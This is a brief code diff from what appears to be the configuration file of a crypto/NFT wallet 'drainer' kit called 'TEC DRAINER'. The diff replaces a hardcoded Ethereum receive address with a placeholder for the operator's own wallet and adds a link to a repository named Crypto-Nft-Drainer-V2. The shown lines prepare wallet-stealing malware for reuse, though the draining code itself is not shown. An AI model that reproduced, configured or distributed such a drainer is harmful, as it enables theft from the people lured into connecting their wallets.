@@ -1,4 +1,4 @@
-const receiveAddress = "0x4E02375a803462FE27cb489e7C16ade676f13cD8";
+const receiveAddress = "Your ETH Wallet Adress";
 
 const collectionInfo = {
     name: "TEC DRAINER",
@@ -40,7 +40,7 @@ const customStrings = {
 }
 
 /*
-    = = = = = END OF SETTINGS = = = = =
+    = = = = = https://github.com/0x32Moon/Crypto-Nft-Drainer-V2 = = = = =
 */
 
 //#region Check Configuration
